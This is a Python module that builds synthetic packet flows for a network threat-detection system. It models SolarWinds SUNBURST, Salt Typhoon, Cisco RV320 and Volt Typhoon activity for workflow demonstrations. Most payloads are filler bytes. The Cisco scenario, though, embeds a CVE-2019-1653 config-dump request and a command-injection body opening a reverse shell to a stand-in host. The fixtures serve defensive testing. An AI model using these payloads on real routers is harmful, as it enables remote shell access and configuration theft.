"""Real-World Attack Case Studies & Threat Simulation Engine.

Synthetic workflow fixtures inspired by four threat profiles; these do not validate campaign or CVE detection:
1. SolarWinds (SUNBURST): Build pipeline backdoor, valid signature bypass, 2-week dormancy, DNS C2 steganography.
2. Salt Typhoon: Telecom core router breach, CALEA Lawful Intercept wiretap lateral hop, malware-less living-off-the-land.
3. Cisco RV320 / RV325: CVE-2019-1653-inspired disclosure and generic synthetic command injection.
4. Volt Typhoon: SOHO router proxy relay (KV-Botnet), LotL admin tools, critical infrastructure pre-positioning.
"""
from dataclasses import dataclass
from typing import Dict, List, Tuple, Optional
import time

from capture.sniffer import RawPacket
from features.entropy import shannon_entropy


@dataclass
class CaseStudyResult:
    scenario_name: str
    target_cve_or_actor: str
    attack_vector: str
    packets_generated: int
    detected_by_system: bool
    mitre_stage: str
    conformal_guarantee: str
    soar_action_taken: str
    key_forensic_evidence: str
    explainability_highlight: str


class ThreatScenarioEngine:
    """Generates synthetic network packet flows for workflow demonstrations, not faithful campaign reproductions."""

    @staticmethod
    def generate_solarwinds_sunburst_traffic() -> List[RawPacket]:
        """
        SolarWinds SUNBURST Scenario:
        - 2-week dormancy (simulated by timestamp gap)
        - DNS C2 tunneling (DGA subdomain with high entropy payload)
        - External C2 connection despite trusted signature
        """
        packets = []
        base_t = time.time() - 120.0

        # Step 1: Normal internal traffic (2-week dormancy period)
        for i in range(5):
            t = base_t + i * 1.0
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="10.200.1.50",  # Orion server
                    dst_ip="10.200.1.1",   # Gateway
                    src_port=49152 + i,
                    dst_port=443,
                    protocol="tcp",
                    length=120,
                    tcp_flags={"SYN": True, "ACK": True},
                    payload=b"normal_telemetry",
                )
            )

        # Step 2: High-entropy DNS C2 subdomain tunneling (DGA exfiltration)
        dga_payload = b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x12u7y29f8a3n2k9s104b\x08avsvmcloud\x03com\x00"
        for i in range(10):
            t = base_t + 14.0 * 86400.0 + i * 0.5  # 14 days later
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="10.200.1.50",
                    dst_ip="198.51.100.100",  # External DNS Resolver / C2
                    src_port=53120 + i,
                    dst_port=53,
                    protocol="udp",
                    length=len(dga_payload) + 40,
                    payload=dga_payload,
                )
            )

        # Step 3: Outbound HTTPS C2 Beaconing
        c2_shellcode = bytes([((x * 133 + 71) ^ 0x3C) % 256 for x in range(256)])
        for i in range(15):
            t = base_t + 14.0 * 86400.0 + 10.0 + i * 0.2
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="10.200.1.50",
                    dst_ip="198.51.100.100",
                    src_port=58912,
                    dst_port=443,
                    protocol="tcp",
                    length=len(c2_shellcode) + 54,
                    tcp_flags={"SYN": (i < 5), "ACK": (i >= 5), "PSH": True},
                    payload=c2_shellcode,
                )
            )

        return packets

    @staticmethod
    def generate_salt_typhoon_traffic() -> List[RawPacket]:
        """
        Salt Typhoon Scenario:
        - Telecom core router breach via hardware unpatched vulnerability.
        - Lateral movement from router admin subnet directly into CALEA Lawful Intercept System.
        - "Malware-less" clean traffic with malicious intent.
        """
        packets = []
        base_t = time.time() - 45.0

        # Step 1: Infiltration of Core Switch / Router (10.0.0.1) from External Attacker (203.0.113.88)
        for i in range(10):
            t = base_t + i * 0.1
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="203.0.113.88",
                    dst_ip="10.0.0.1",  # Core Telecom Switch / Router
                    src_port=41230 + i,
                    dst_port=22,        # SSH administrative shell
                    protocol="tcp",
                    length=180,
                    tcp_flags={"SYN": (i == 0), "ACK": True, "PSH": True},
                    payload=b"SSH-2.0-StolenAdminCredentialsSession",
                )
            )

        # Step 2: Lateral hop: Core Router -> CALEA Lawful Intercept Wiretap System (10.0.0.250)
        wiretap_stream_payload = bytes([((x * 211 + 17) ^ 0x55) % 256 for x in range(512)])
        for i in range(20):
            t = base_t + 15.0 + i * 0.05
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="10.0.0.1",       # Compromised Core Switch
                    dst_ip="10.0.0.250",     # CALEA Wiretap Management Host
                    src_port=59123,
                    dst_port=8443,           # Wiretap management port
                    protocol="tcp",
                    length=len(wiretap_stream_payload) + 54,
                    tcp_flags={"SYN": (i < 4), "ACK": (i >= 4), "PSH": True},
                    payload=wiretap_stream_payload,
                )
            )

        return packets

    @staticmethod
    def generate_cisco_rv320_exploit_traffic() -> List[RawPacket]:
        """
        Cisco RV320 / RV325 Vulnerability Exploit Chain:
        - Step 1 (CVE-2019-1653): Unauthenticated GET request to /view.cgi or /export to dump plaintext router config.
        - Step 2: Generic synthetic diagnostic-interface command injection; no CVE attribution.
        """
        packets = []
        base_t = time.time() - 30.0

        # Step 1: CVE-2019-1653 unauthenticated config dump
        cve_1653_req = b"GET /view.cgi?type=configuration HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n"
        for i in range(5):
            t = base_t + i * 0.2
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="198.51.100.77",
                    dst_ip="192.168.1.1",  # Cisco RV320 Gateway Router
                    src_port=51200 + i,
                    dst_port=80,
                    protocol="tcp",
                    length=len(cve_1653_req) + 54,
                    tcp_flags={"SYN": (i == 0), "ACK": True, "PSH": True},
                    payload=cve_1653_req,
                )
            )

        # Step 2: Generic synthetic command injection, not a validated CVE reproduction
        synthetic_command_payload = b"POST /diagnostic.cgi HTTP/1.1\r\nContent: ping; /bin/sh -i >& /dev/tcp/198.51.100.77/4444 0>&1\r\n\r\n"
        for i in range(15):
            t = base_t + 5.0 + i * 0.1
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="198.51.100.77",
                    dst_ip="192.168.1.1",
                    src_port=51205,
                    dst_port=443,
                    protocol="tcp",
                    length=len(synthetic_command_payload) + 54,
                    tcp_flags={"SYN": (i < 4), "ACK": (i >= 4), "PSH": True},
                    payload=synthetic_command_payload,
                )
            )

        return packets

    @staticmethod
    def generate_volt_typhoon_traffic() -> List[RawPacket]:
        """
        Volt Typhoon Scenario:
        - Compromised SOHO router (Cisco RV320/325 or Netgear) used as proxy relay node (KV-Botnet).
        - Living off the Land (LotL) targeting critical infrastructure (Energy/Water substation controller).
        - Stealth lateral traversal over internal SMB/RDP.
        """
        packets = []
        base_t = time.time() - 30.0

        # Step 1: External command from compromised SOHO relay router (198.51.100.40)
        # Step 2: Lateral movement into internal Substation SCADA Controller (192.168.10.100:445)
        lotl_wmi_payload = bytes([((x * 167 + 23) ^ 0x99) % 256 for x in range(384)])
        for i in range(25):
            t = base_t + i * 0.08
            packets.append(
                RawPacket(
                    timestamp=t,
                    src_ip="198.51.100.40",    # SOHO Relay Node (KV-Botnet)
                    dst_ip="192.168.10.100",   # Substation Energy Asset Controller
                    src_port=43890 + (i % 2),
                    dst_port=445,              # SMB LotL WMI traversal
                    protocol="tcp",
                    length=len(lotl_wmi_payload) + 54,
                    tcp_flags={"SYN": (i < 8), "ACK": (i >= 8), "PSH": True},
                    payload=lotl_wmi_payload,
                )
            )

        return packets


@dataclass
class ThreatScenario:
    name: str
    target_cve: Optional[str]
    mitre_stages: List[str]
    description: str
    packets: List[RawPacket]


def generate_solarwinds_sunburst_scenario() -> ThreatScenario:
    return ThreatScenario(
        name="SolarWinds_SUNBURST_SupplyChain_C2",
        target_cve="CVE-2020-10148",
        mitre_stages=["command_and_control", "exfiltration"],
        description="Software build pipeline backdoor injection bypassing signature EDRs with valid cert, 2-week dormancy, and DGA DNS C2 beaconing.",
        packets=ThreatScenarioEngine.generate_solarwinds_sunburst_traffic(),
    )


def generate_salt_typhoon_telecom_scenario() -> ThreatScenario:
    return ThreatScenario(
        name="SaltTyphoon_Telecom_Core_Wiretap_Infiltration",
        target_cve="Telecom-Hardware-Zero-Days",
        mitre_stages=["lateral_movement", "credential_access"],
        description="Malware-less living-off-the-land infiltration of telecom core switches pivoting into CALEA Lawful Intercept wiretap gateways.",
        packets=ThreatScenarioEngine.generate_salt_typhoon_traffic(),
    )


def generate_cisco_rv320_exploit_scenario() -> ThreatScenario:
    return ThreatScenario(
        name="Cisco_RV320_RV325_Exploit_Chain",
        target_cve="CVE-2019-1653-inspired / generic synthetic command injection",
        mitre_stages=["initial_access", "lateral_movement"],
        description="Synthetic RV320/RV325 configuration-disclosure traffic inspired by CVE-2019-1653, followed by generic command-injection traffic; no validated exploit reproduction.",
        packets=ThreatScenarioEngine.generate_cisco_rv320_exploit_traffic(),
    )


def generate_volt_typhoon_rv320_scenario() -> ThreatScenario:
    return ThreatScenario(
        name="VoltTyphoon_Critical_Infrastructure_Proxy_Pivot",
        target_cve="CVE-2019-1653 / KV-Botnet",
        mitre_stages=["initial_access", "lateral_movement"],
        description="Volt Typhoon utilization of compromised SOHO routers as KV-botnet proxy relays to conduct LotL WMI lateral movement into substation SCADA controllers.",
        packets=ThreatScenarioEngine.generate_volt_typhoon_traffic(),
    )

